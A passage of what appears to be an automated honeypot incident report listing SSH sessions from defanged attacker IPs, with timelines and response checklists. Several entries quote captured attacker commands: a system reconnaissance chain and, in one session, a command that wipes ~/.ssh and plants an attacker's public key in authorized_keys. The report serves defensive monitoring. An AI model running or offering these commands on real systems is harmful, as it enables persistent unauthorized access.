| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:59:46` | `cowrie.session.connect` |
| `2026-07-08 18:59:47` | `cowrie.client.version` |
| `2026-07-08 18:59:47` | `cowrie.client.kex` |
| `2026-07-08 18:59:49` | `cowrie.login.success` |
| `2026-07-08 18:59:50` | `cowrie.session.params` |
| `2026-07-08 18:59:50` | `cowrie.command.input` |
| `2026-07-08 18:59:50` | `cowrie.command.input` |
| `2026-07-08 18:59:50` | `cowrie.command.input` |
| `2026-07-08 18:59:50` | `cowrie.command.input` |
| `2026-07-08 18:59:50` | `cowrie.command.input` |
| `2026-07-08 18:59:50` | `cowrie.command.success` |
| `2026-07-08 18:59:50` | `cowrie.command.input` |
| `2026-07-08 18:59:50` | `cowrie.command.input` |
| `2026-07-08 18:59:50` | `cowrie.command.input` |
| `2026-07-08 18:59:50` | `cowrie.command.input` |
| `2026-07-08 18:59:51` | `cowrie.log.closed` |
| `2026-07-08 18:59:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c693d1257e6

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 19:00 |
| **Last Seen** | 2026-07-08 19:00 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:00:10` | `cowrie.session.connect` |
| `2026-07-08 19:00:12` | `cowrie.client.version` |
| `2026-07-08 19:00:12` | `cowrie.client.kex` |
| `2026-07-08 19:00:17` | `cowrie.login.success` |
| `2026-07-08 19:00:20` | `cowrie.session.params` |
| `2026-07-08 19:00:20` | `cowrie.command.input` |
| `2026-07-08 19:00:21` | `cowrie.log.closed` |
| `2026-07-08 19:00:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3f462252cc3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:01 |
| **Last Seen** | 2026-07-08 19:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:01:06` | `cowrie.session.connect` |
| `2026-07-08 19:01:07` | `cowrie.client.version` |
| `2026-07-08 19:01:07` | `cowrie.client.kex` |
| `2026-07-08 19:01:09` | `cowrie.login.success` |
| `2026-07-08 19:01:11` | `cowrie.session.params` |
| `2026-07-08 19:01:11` | `cowrie.command.input` |
| `2026-07-08 19:01:11` | `cowrie.command.input` |
| `2026-07-08 19:01:11` | `cowrie.command.input` |
| `2026-07-08 19:01:11` | `cowrie.command.input` |
| `2026-07-08 19:01:11` | `cowrie.command.input` |
| `2026-07-08 19:01:11` | `cowrie.command.success` |
| `2026-07-08 19:01:11` | `cowrie.command.input` |
| `2026-07-08 19:01:11` | `cowrie.command.input` |
| `2026-07-08 19:01:11` | `cowrie.command.input` |
| `2026-07-08 19:01:11` | `cowrie.command.input` |
| `2026-07-08 19:01:12` | `cowrie.log.closed` |
| `2026-07-08 19:01:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4303ab363439

| Field | Detail |
|---|---|
| **Source IP** | `125.35.109[.]214` |
| **First Seen** | 2026-07-08 19:01 |
| **Last Seen** | 2026-07-08 19:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:01:12` | `cowrie.session.connect` |
| `2026-07-08 19:01:13` | `cowrie.client.version` |
| `2026-07-08 19:01:13` | `cowrie.client.kex` |
| `2026-07-08 19:01:15` | `cowrie.login.success` |
| `2026-07-08 19:01:16` | `cowrie.direct-tcpip.request` |
| `2026-07-08 19:01:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.35.109[.]214` to AbuseIPDB if not already reported
- [ ] Block `125.35.109[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-471f9f3f0c24

| Field | Detail |
|---|---|
| **Source IP** | `138.121.202[.]90` |
| **First Seen** | 2026-07-08 19:01 |
| **Last Seen** | 2026-07-08 19:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:01:25` | `cowrie.session.connect` |
| `2026-07-08 19:01:26` | `cowrie.client.version` |
| `2026-07-08 19:01:26` | `cowrie.client.kex` |
| `2026-07-08 19:01:28` | `cowrie.login.success` |
| `2026-07-08 19:01:28` | `cowrie.direct-tcpip.request` |
| `2026-07-08 19:01:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.121.202[.]90` to AbuseIPDB if not already reported
- [ ] Block `138.121.202[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20d306b83ee2

| Field | Detail |
|---|---|
| **Source IP** | `106.89.59[.]26` |
| **First Seen** | 2026-07-08 19:01 |
| **Last Seen** | 2026-07-08 19:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:01:31` | `cowrie.session.connect` |
| `2026-07-08 19:01:31` | `cowrie.client.version` |
| `2026-07-08 19:01:31` | `cowrie.client.kex` |
| `2026-07-08 19:01:34` | `cowrie.login.success` |
| `2026-07-08 19:01:34` | `cowrie.direct-tcpip.request` |
| `2026-07-08 19:01:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.89.59[.]26` to AbuseIPDB if not already reported
- [ ] Block `106.89.59[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d71b18665cc9

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]163` |
| **First Seen** | 2026-07-08 19:01 |
| **Last Seen** | 2026-07-08 19:02 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:01:49` | `cowrie.session.connect` |
| `2026-07-08 19:01:50` | `cowrie.client.version` |
| `2026-07-08 19:01:50` | `cowrie.client.kex` |
| `2026-07-08 19:01:58` | `cowrie.login.success` |
| `2026-07-08 19:02:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]163` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9061bff5d65

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 19:02 |
| **Last Seen** | 2026-07-08 19:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:02:07` | `cowrie.session.connect` |
| `2026-07-08 19:02:07` | `cowrie.client.version` |
| `2026-07-08 19:02:07` | `cowrie.client.kex` |
| `2026-07-08 19:02:09` | `cowrie.login.success` |
| `2026-07-08 19:02:10` | `cowrie.session.params` |
| `2026-07-08 19:02:10` | `cowrie.command.input` |
| `2026-07-08 19:02:10` | `cowrie.command.input` |
| `2026-07-08 19:02:10` | `cowrie.command.input` |
| `2026-07-08 19:02:10` | `cowrie.command.input` |
| `2026-07-08 19:02:10` | `cowrie.command.input` |
| `2026-07-08 19:02:10` | `cowrie.command.success` |
| `2026-07-08 19:02:10` | `cowrie.command.input` |
| `2026-07-08 19:02:10` | `cowrie.command.input` |
| `2026-07-08 19:02:10` | `cowrie.command.input` |
| `2026-07-08 19:02:10` | `cowrie.command.input` |
| `2026-07-08 19:02:10` | `cowrie.log.closed` |
| `2026-07-08 19:02:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70d4fa2df6a5

| Field | Detail |
|---|---|
| **Source IP** | `47.239.170[.]243` |
| **First Seen** | 2026-07-08 19:03 |
| **Last Seen** | 2026-07-08 19:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:03:06` | `cowrie.session.connect` |
| `2026-07-08 19:03:06` | `cowrie.client.version` |
| `2026-07-08 19:03:06` | `cowrie.client.kex` |
| `2026-07-08 19:03:07` | `cowrie.login.success` |
| `2026-07-08 19:03:08` | `cowrie.session.params` |
| `2026-07-08 19:03:08` | `cowrie.command.input` |
| `2026-07-08 19:03:08` | `cowrie.command.failed` |
| `2026-07-08 19:03:09` | `cowrie.log.closed` |
| `2026-07-08 19:03:09` | `cowrie.session.params` |
| `2026-07-08 19:03:09` | `cowrie.command.input` |
| `2026-07-08 19:03:09` | `cowrie.session.file_download` |
| `2026-07-08 19:03:09` | `cowrie.log.closed` |
| `2026-07-08 19:03:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.239.170[.]243` to AbuseIPDB if not already reported
- [ ] Block `47.239.170[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77543a60106e

| Field | Detail |
|---|---|
| **Source IP** | `47.239.170[.]243` |
| **First Seen** | 2026-07-08 19:03 |
| **Last Seen** | 2026-07-08 19:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:03:10` | `cowrie.session.connect` |
| `2026-07-08 19:03:10` | `cowrie.client.version` |
| `2026-07-08 19:03:10` | `cowrie.client.kex` |
| `2026-07-08 19:03:11` | `cowrie.login.success` |
| `2026-07-08 19:03:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.239.170[.]243` to AbuseIPDB if not already reported
- [ ] Block `47.239.170[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe8153a1f6ed

| Field | Detail |
|---|---|
| **Source IP** | `47.239.170[.]243` |
| **First Seen** | 2026-07-08 19:03 |
| **Last Seen** | 2026-07-08 19:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:03:11` | `cowrie.session.connect` |
| `2026-07-08 19:03:11` | `cowrie.client.version` |
| `2026-07-08 19:03:11` | `cowrie.client.kex` |
| `2026-07-08 19:03:12` | `cowrie.login.success` |
| `2026-07-08 19:03:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.239.170[.]243` to AbuseIPDB if not already reported
- [ ] Block `47.239.170[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9817686de027

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:03 |
| **Last Seen** | 2026-07-08 19:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:03:13` | `cowrie.session.connect` |
| `2026-07-08 19:03:13` | `cowrie.client.version` |
| `2026-07-08 19:03:13` | `cowrie.client.kex` |
| `2026-07-08 19:03:15` | `cowrie.login.success` |
| `2026-07-08 19:03:16` | `cowrie.session.params` |
| `2026-07-08 19:03:16` | `cowrie.command.input` |
| `2026-07-08 19:03:16` | `cowrie.command.input` |
| `2026-07-08 19:03:16` | `cowrie.command.input` |
| `2026-07-08 19:03:16` | `cowrie.command.input` |
| `2026-07-08 19:03:16` | `cowrie.command.input` |
| `2026-07-08 19:03:16` | `cowrie.command.success` |
| `2026-07-08 19:03:16` | `cowrie.command.input` |
| `2026-07-08 19:03:16` | `cowrie.command.input` |
| `2026-07-08 19:03:16` | `cowrie.command.input` |
| `2026-07-08 19:03:16` | `cowrie.command.input` |
| `2026-07-08 19:03:17` | `cowrie.log.closed` |
| `2026-07-08 19:03:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f63f76569113

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 19:04 |
| **Last Seen** | 2026-07-08 19:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:04:28` | `cowrie.session.connect` |
| `2026-07-08 19:04:29` | `cowrie.client.version` |
| `2026-07-08 19:04:29` | `cowrie.client.kex` |
| `2026-07-08 19:04:30` | `cowrie.login.success` |
| `2026-07-08 19:04:32` | `cowrie.session.params` |
| `2026-07-08 19:04:32` | `cowrie.command.input` |
| `2026-07-08 19:04:32` | `cowrie.command.input` |
| `2026-07-08 19:04:32` | `cowrie.command.input` |
| `2026-07-08 19:04:32` | `cowrie.command.input` |
| `2026-07-08 19:04:32` | `cowrie.command.input` |
| `2026-07-08 19:04:32` | `cowrie.command.success` |
| `2026-07-08 19:04:32` | `cowrie.command.input` |
| `2026-07-08 19:04:32` | `cowrie.command.input` |
| `2026-07-08 19:04:32` | `cowrie.command.input` |
| `2026-07-08 19:04:32` | `cowrie.command.input` |
| `2026-07-08 19:04:32` | `cowrie.log.closed` |
| `2026-07-08 19:04:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d1e5967023b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:05 |
| **Last Seen** | 2026-07-08 19:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:05:18` | `cowrie.session.connect` |
| `2026-07-08 19:05:18` | `cowrie.client.version` |
| `2026-07-08 19:05:18` | `cowrie.client.kex` |
| `2026-07-08 19:05:20` | `cowrie.login.success` |
| `2026-07-08 19:05:21` | `cowrie.session.params` |
| `2026-07-08 19:05:21` | `cowrie.command.input` |
| `2026-07-08 19:05:21` | `cowrie.command.input` |
| `2026-07-08 19:05:21` | `cowrie.command.input` |
| `2026-07-08 19:05:21` | `cowrie.command.input` |
| `2026-07-08 19:05:21` | `cowrie.command.input` |
| `2026-07-08 19:05:21` | `cowrie.command.success` |
| `2026-07-08 19:05:21` | `cowrie.command.input` |
| `2026-07-08 19:05:21` | `cowrie.command.input` |
| `2026-07-08 19:05:21` | `cowrie.command.input` |
| `2026-07-08 19:05:21` | `cowrie.command.input` |
| `2026-07-08 19:05:22` | `cowrie.log.closed` |
| `2026-07-08 19:05:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62a86ecd8523

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 19:06 |
| **Last Seen** | 2026-07-08 19:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:06:50` | `cowrie.session.connect` |
| `2026-07-08 19:06:50` | `cowrie.client.version` |
| `2026-07-08 19:06:50` | `cowrie.client.kex` |
| `2026-07-08 19:06:52` | `cowrie.login.success` |
| `2026-07-08 19:06:53` | `cowrie.session.params` |
| `2026-07-08 19:06:53` | `cowrie.command.input` |
| `2026-07-08 19:06:53` | `cowrie.command.input` |
| `2026-07-08 19:06:53` | `cowrie.command.input` |
| `2026-07-08 19:06:53` | `cowrie.command.input` |
| `2026-07-08 19:06:53` | `cowrie.command.input` |
| `2026-07-08 19:06:53` | `cowrie.command.success` |
| `2026-07-08 19:06:53` | `cowrie.command.input` |
| `2026-07-08 19:06:53` | `cowrie.command.input` |
| `2026-07-08 19:06:53` | `cowrie.command.input` |
| `2026-07-08 19:06:53` | `cowrie.command.input` |
| `2026-07-08 19:06:54` | `cowrie.log.closed` |
| `2026-07-08 19:06:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0249bbe5deb7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:07 |
| **Last Seen** | 2026-07-08 19:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:07:28` | `cowrie.session.connect` |
| `2026-07-08 19:07:28` | `cowrie.client.version` |
| `2026-07-08 19:07:29` | `cowrie.client.kex` |
| `2026-07-08 19:07:29` | `cowrie.login.success` |
| `2026-07-08 19:07:31` | `cowrie.session.params` |
| `2026-07-08 19:07:31` | `cowrie.command.input` |
| `2026-07-08 19:07:31` | `cowrie.command.input` |
| `2026-07-08 19:07:31` | `cowrie.command.input` |
| `2026-07-08 19:07:31` | `cowrie.command.input` |
| `2026-07-08 19:07:31` | `cowrie.command.input` |
| `2026-07-08 19:07:31` | `cowrie.command.success` |
| `2026-07-08 19:07:31` | `cowrie.command.input` |
| `2026-07-08 19:07:31` | `cowrie.command.input` |
| `2026-07-08 19:07:31` | `cowrie.command.input` |
| `2026-07-08 19:07:31` | `cowrie.command.input` |
| `2026-07-08 19:07:31` | `cowrie.log.closed` |
| `2026-07-08 19:07:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52467765862c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 19:09 |
| **Last Seen** | 2026-07-08 19:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
